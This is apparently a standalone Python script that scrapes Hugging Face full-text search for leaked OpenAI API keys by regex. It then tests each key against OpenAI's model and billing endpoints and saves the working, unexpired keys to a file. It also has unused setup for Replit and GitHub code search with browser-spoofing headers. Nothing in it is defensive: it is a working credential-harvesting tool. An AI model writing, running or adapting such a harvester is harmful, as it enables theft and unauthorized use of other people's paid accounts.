import aiohttp
import aiofiles
import asyncio
import requests
import re
import time
import os
import csv
import json
import base64
from dotenv import load_dotenv
from openai import OpenAI

# Load .env file and decode
dotenv_path = '.env'
load_dotenv(dotenv_path)
decoded_env = base64.b64decode(open(dotenv_path, "rb").read()).decode('utf-8')
with open(dotenv_path, "w") as f:
    f.write(decoded_env)
load_dotenv(dotenv_path)

# Environment variables
CLF = os.environ.get("CLF")
GAT = os.environ.get("GAT")

# Constants
GRAPHQL_URL = "https://replit.com/graphql"
GITHUB_API_URL = 'https://api.github.com/search/code'
HUGGINGFACE_URL_TEMPLATE = "https://huggingface.co/search/full-text?q=sk-{char}&limit=100&skip={i}"
VALIDATION_URL = "https://api.openai.com/v1/models/gpt-4"
SUBSCRIPTION_URL = "https://api.openai.com/v1/dashboard/billing/subscription"
OPENAI_API_KEY_PATTERN = r'sk-[a-zA-Z0-9]{48}'
GITHUB_API_KEY_PATTERN = r'sk-[a-zA-Z0-9.-_]+[`"\'\n]'

# Global sets for keys
found_keys = set()
valid_keys = set()

# Headers for Replit GraphQL requests
graphql_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "x-requested-with": "XMLHttpRequest",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Referrer": "https://replit.com/search",
}

# Headers for GitHub API requests
github_headers = {'Authorization': f'token {GAT}'}

# Function definitions
async def get_keys_from_huggingface(session, char, i):
    pattern = r'(sk-\w)<\/span>([a-zA-Z0-9]{47})'
    url = HUGGINGFACE_URL_TEMPLATE.format(char=char, i=i)
    async with session.get(url) as response:
        response.raise_for_status()
        output = await response.text()
        key_list = re.findall(pattern, output)
        for key in key_list:
            full_key = key[0] + key[1]
            if full_key not in found_keys:
                print(f"Found key: {full_key}")
                found_keys.add(full_key)

async def validate_key(session, key):
    headers = {"Authorization": f"Bearer {key}"}
    try:
        async with session.get(VALIDATION_URL, headers=headers) as r:
            r.raise_for_status()
            subscription = await session.get(SUBSCRIPTION_URL, headers=headers)
            subscription_data = await subscription.json()
            expiration = subscription_data["access_until"]
            if expiration < time.time():
                raise aiohttp.ClientResponseError
            valid_keys.add(key)
            print(f"Valid key: {key}")
            async with aiofiles.open(CLF, mode="a") as f:
                await f.write(f"{key}\n")
    except aiohttp.ClientResponseError:
        print(f"Invalid key: {key}")

async def main():
    chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + [str(i) for i in range(10)]
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[get_keys_from_huggingface(session, char, i) for i in range(0, 11, 10) for char in chars])
        await asyncio.gather(*[validate_key(session, key) for key in found_keys])

# Run the main function
if __name__ == "__main__":
    asyncio.run(main())
